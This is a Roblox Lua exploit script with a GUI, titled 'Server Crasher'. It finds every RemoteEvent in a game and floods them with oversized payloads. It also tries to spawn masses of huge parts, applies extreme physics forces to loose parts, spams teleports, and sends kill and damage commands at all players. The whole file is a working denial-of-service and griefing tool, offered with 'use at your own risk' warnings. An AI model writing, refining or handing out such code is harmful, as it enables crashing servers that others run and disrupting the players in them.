-- SERVER CRASHER - LAG & CRASH
-- ULTIMATE DESTRUCTION TOOL
-- Use with EXTREME CAUTION!

task.wait(2)

local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui", 10)

-- Remove old GUI
pcall(function()
    if playerGui:FindFirstChild("CrasherGUI") then
        playerGui.CrasherGUI:Destroy()
        task.wait(0.5)
    end
end)

-- ============================================
-- VARIABLES
-- ============================================
local crashRunning = false
local remotes = {}
local crashConnections = {}

-- ============================================
-- NOTIFICATION
-- ============================================
local function notif(msg, durasi)
    pcall(function()
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Server Crasher";
            Text = msg;
            Duration = durasi or 3;
        })
    end)
    print("[Crasher]", msg)
end

-- ============================================
-- SCAN REMOTES
-- ============================================
local function scanRemotes()
    remotes = {}
    
    for _, service in pairs(game:GetChildren()) do
        pcall(function()
            for _, obj in pairs(service:GetDescendants()) do
                if obj:IsA("RemoteEvent") then
                    table.insert(remotes, obj)
                end
            end
        end)
    end
    
    print("=== REMOTES FOUND ===")
    print("Total:", #remotes)
    print("=====================")
    
    return #remotes
end

-- ============================================
-- CRASH METHODS
-- ============================================

-- Method 1: Spam RemoteEvents (Most effective)
local function spamRemotes()
    print("[CRASH] Spamming remotes...")
    
    local spamCount = 0
    local connection = RunService.Heartbeat:Connect(function()
        if not crashRunning then return end
        
        for _, remote in pairs(remotes) do
            pcall(function()
                -- Spam with massive data
                for i = 1, 50 do
                    remote:FireServer(string.rep("X", 10000)) -- Large string
                    remote:FireServer({data = string.rep("CRASH", 1000)})
                    remote:FireServer(table.create(1000, "spam"))
                    spamCount = spamCount + 1
                end
            end)
        end
    end)
    
    table.insert(crashConnections, connection)
    return spamCount
end

-- Method 2: Infinite Part Creation (Server memory overload)
local function infiniteParts()
    print("[CRASH] Creating infinite parts...")
    
    local connection = RunService.Heartbeat:Connect(function()
        if not crashRunning then return end
        
        for _, remote in pairs(remotes) do
            pcall(function()
                -- Try to create parts via remotes
                for i = 1, 100 do
                    remote:FireServer("CreatePart", {
                        Size = Vector3.new(1000, 1000, 1000),
                        Position = Vector3.new(math.random(-10000, 10000), math.random(-10000, 10000), math.random(-10000, 10000))
                    })
                    
                    remote:FireServer("SpawnObject", "Part", Vector3.new(0, 999999, 0))
                    
                    remote:FireServer({
                        Action = "Create",
                        Type = "Part",
                        Amount = 999999
                    })
                end
            end)
        end
    end)
    
    table.insert(crashConnections, connection)
end

-- Method 3: Physics Abuse (Lag generator)
local function physicsAbuse()
    print("[CRASH] Physics abuse...")
    
    local connection = RunService.Heartbeat:Connect(function()
        if not crashRunning then return end
        
        -- Find all unanchored parts
        for _, obj in pairs(Workspace:GetDescendants()) do
            if obj:IsA("BasePart") and not obj.Anchored then
                pcall(function()
                    -- Apply extreme forces
                    local bv = Instance.new("BodyVelocity")
                    bv.Velocity = Vector3.new(math.random(-999999, 999999), math.random(-999999, 999999), math.random(-999999, 999999))
                    bv.MaxForce = Vector3.new(9e9, 9e9, 9e9)
                    bv.Parent = obj
                    
                    task.spawn(function()
                        task.wait(0.1)
                        pcall(function() bv:Destroy() end)
                    end)
                end)
            end
        end
    end)
    
    table.insert(crashConnections, connection)
end

-- Method 4: Massive Remote Spam (Nuclear option)
local function nuclearSpam()
    print("[CRASH] NUCLEAR SPAM ACTIVATED!")
    
    local connection = RunService.Heartbeat:Connect(function()
        if not crashRunning then return end
        
        for _, remote in pairs(remotes) do
            pcall(function()
                -- Maximum spam intensity
                for i = 1, 200 do
                    remote:FireServer(string.rep("NUKE", 5000))
                    remote:FireServer({crash = table.create(5000, "OVERLOAD")})
                    remote:FireServer(table.create(100, {data = string.rep("X", 1000)}))
                end
            end)
        end
        
        -- Also spam all possible actions
        for _, remote in pairs(remotes) do
            pcall(function()
                remote:FireServer("Crash")
                remote:FireServer("Lag")
                remote:FireServer("Overload")
                remote:FireServer({Action = "Crash"})
                remote:FireServer({type = "overload", amount = 999999})
            end)
        end
    end)
    
    table.insert(crashConnections, connection)
end

-- Method 5: Mass Teleport Spam (TP abuse)
local function teleportSpam()
    print("[CRASH] Mass teleport spam...")
    
    local connection = RunService.Heartbeat:Connect(function()
        if not crashRunning then return end
        
        for _, remote in pairs(remotes) do
            pcall(function()
                -- Spam teleport commands
                for i = 1, 100 do
                    local randomPos = Vector3.new(
                        math.random(-999999, 999999),
                        math.random(-999999, 999999),
                        math.random(-999999, 999999)
                    )
                    
                    remote:FireServer("Teleport", player, randomPos)
                    remote:FireServer("TP", player, randomPos)
                    remote:FireServer({Action = "Teleport", Player = player, Position = randomPos})
                    remote:FireServer("MoveTo", randomPos)
                end
            end)
        end
    end)
    
    table.insert(crashConnections, connection)
end

-- Method 6: Exploit All Players (Multi-target)
local function targetAllPlayers()
    print("[CRASH] Targeting all players...")
    
    local connection = RunService.Heartbeat:Connect(function()
        if not crashRunning then return end
        
        for _, plr in pairs(Players:GetPlayers()) do
            for _, remote in pairs(remotes) do
                pcall(function()
                    -- Spam commands on all players
                    for i = 1, 50 do
                        remote:FireServer("Kill", plr)
                        remote:FireServer("Damage", plr, 999999)
                        remote:FireServer("Teleport", plr, Vector3.new(0, -999999, 0))
                        remote:FireServer({Action = "Kill", Player = plr})
                    end
                end)
            end
        end
    end)
    
    table.insert(crashConnections, connection)
end

-- ============================================
-- MAIN CRASH FUNCTION
-- ============================================
local function startCrash()
    if crashRunning then
        notif("⚠️ Already running!", 2)
        return
    end
    
    crashRunning = true
    notif("💥 SERVER CRASH STARTED!", 4)
    
    -- Scan remotes first
    local remoteCount = scanRemotes()
    
    if remoteCount == 0 then
        notif("❌ No remotes found!", 3)
        crashRunning = false
        return
    end
    
    notif("🔥 Using " .. remoteCount .. " remotes!", 3)
    
    -- Activate ALL crash methods simultaneously
    task.spawn(spamRemotes)
    task.wait(0.1)
    task.spawn(infiniteParts)
    task.wait(0.1)
    task.spawn(physicsAbuse)
    task.wait(0.1)
    task.spawn(nuclearSpam)
    task.wait(0.1)
    task.spawn(teleportSpam)
    task.wait(0.1)
    task.spawn(targetAllPlayers)
    
    notif("💣 ALL METHODS ACTIVE!", 4)
    notif("⚠️ SERVER OVERLOAD IN PROGRESS...", 5)
    
    print("================================")
    print("CRASH METHODS ACTIVE:")
    print("- Remote spam")
    print("- Infinite parts")
    print("- Physics abuse")
    print("- Nuclear spam")
    print("- Teleport spam")
    print("- Multi-target")
    print("================================")
end

local function stopCrash()
    if not crashRunning then
        notif("⚠️ Not running!", 2)
        return
    end
    
    crashRunning = false
    
    -- Disconnect all connections
    for _, connection in pairs(crashConnections) do
        pcall(function()
            connection:Disconnect()
        end)
    end
    
    crashConnections = {}
    
    notif("⏸️ CRASH STOPPED", 3)
    print("[CRASH] All methods stopped")
end

-- ============================================
-- CREATE GUI
-- ============================================

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "CrasherGUI"
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent = playerGui

-- Main Frame (Compact design)
local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 350, 0, 280)
MainFrame.Position = UDim2.new(0.5, -175, 0.5, -140)
MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
MainFrame.BorderSizePixel = 0
MainFrame.Active = true
MainFrame.Draggable = true
MainFrame.Parent = ScreenGui

local MainCorner = Instance.new("UICorner")
MainCorner.CornerRadius = UDim.new(0, 15)
MainCorner.Parent = MainFrame

-- Header
local Header = Instance.new("Frame")
Header.Size = UDim2.new(1, 0, 0, 55)
Header.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
Header.BorderSizePixel = 0
Header.Parent = MainFrame

local HeaderCorner = Instance.new("UICorner")
HeaderCorner.CornerRadius = UDim.new(0, 15)
HeaderCorner.Parent = Header

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, -70, 1, 0)
Title.Position = UDim2.new(0, 15, 0, 0)
Title.BackgroundTransparency = 1
Title.Text = "💥 SERVER CRASHER"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 20
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.Parent = Header

-- Close Button
local CloseBtn = Instance.new("TextButton")
CloseBtn.Size = UDim2.new(0, 50, 0, 50)
CloseBtn.Position = UDim2.new(1, -53, 0, 2.5)
CloseBtn.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
CloseBtn.Text = "✕"
CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseBtn.Font = Enum.Font.GothamBold
CloseBtn.TextSize = 24
CloseBtn.Parent = Header

local CloseBtnCorner = Instance.new("UICorner")
CloseBtnCorner.CornerRadius = UDim.new(0, 10)
CloseBtnCorner.Parent = CloseBtn

CloseBtn.MouseButton1Click:Connect(function()
    stopCrash()
    ScreenGui:Destroy()
    notif("👋 GUI Closed", 2)
end)

-- Content
local Content = Instance.new("Frame")
Content.Size = UDim2.new(1, -30, 1, -70)
Content.Position = UDim2.new(0, 15, 0, 60)
Content.BackgroundTransparency = 1
Content.Parent = MainFrame

-- Crash Button (BIG RED)
local CrashBtn = Instance.new("TextButton")
CrashBtn.Size = UDim2.new(1, 0, 0, 70)
CrashBtn.Position = UDim2.new(0, 0, 0, 0)
CrashBtn.BackgroundColor3 = Color3.fromRGB(220, 20, 20)
CrashBtn.Text = "💣 CRASH SERVER"
CrashBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
CrashBtn.Font = Enum.Font.GothamBold
CrashBtn.TextSize = 24
CrashBtn.Parent = Content

local CrashBtnCorner = Instance.new("UICorner")
CrashBtnCorner.CornerRadius = UDim.new(0, 12)
CrashBtnCorner.Parent = CrashBtn

CrashBtn.MouseButton1Click:Connect(function()
    startCrash()
    CrashBtn.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
    CrashBtn.Text = "🔥 CRASHING..."
end)

-- Stop Button
local StopBtn = Instance.new("TextButton")
StopBtn.Size = UDim2.new(1, 0, 0, 60)
StopBtn.Position = UDim2.new(0, 0, 0, 80)
StopBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
StopBtn.Text = "⏸️ STOP CRASH"
StopBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
StopBtn.Font = Enum.Font.GothamBold
StopBtn.TextSize = 20
StopBtn.Parent = Content

local StopBtnCorner = Instance.new("UICorner")
StopBtnCorner.CornerRadius = UDim.new(0, 12)
StopBtnCorner.Parent = StopBtn

StopBtn.MouseButton1Click:Connect(function()
    stopCrash()
    CrashBtn.BackgroundColor3 = Color3.fromRGB(220, 20, 20)
    CrashBtn.Text = "💣 CRASH SERVER"
end)

-- Info Label
local Info = Instance.new("TextLabel")
Info.Size = UDim2.new(1, 0, 0, 60)
Info.Position = UDim2.new(0, 0, 1, -60)
Info.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Info.TextColor3 = Color3.fromRGB(200, 200, 200)
Info.Font = Enum.Font.Gotham
Info.TextSize = 11
Info.TextWrapped = true
Info.Text = [[⚠️ WARNING: EXTREME TOOL!

Akan overload server dengan:
• Remote spam (massive data)
• Part creation flood
• Physics abuse
• Multi-method attack

Server bisa LAG PARAH atau CRASH!

Use at your own risk!]]
Info.Parent = Content

local InfoCorner = Instance.new("UICorner")
InfoCorner.CornerRadius = UDim.new(0, 10)
InfoCorner.Parent = Info

local InfoPadding = Instance.new("UIPadding")
InfoPadding.PaddingTop = UDim.new(0, 8)
InfoPadding.PaddingLeft = UDim.new(0, 8)
InfoPadding.PaddingRight = UDim.new(0, 8)
InfoPadding.Parent = Info

-- Initial notification
notif("💥 Server Crasher loaded!", 3)
print("================================")
print("SERVER CRASHER")
print("PlaceId:", game.PlaceId)
print("Ready to crash server!")
print("================================")
print("")
print("⚠️ WARNING: EXTREME DESTRUCTION TOOL!")
print("Use with EXTREME CAUTION!")
print("")
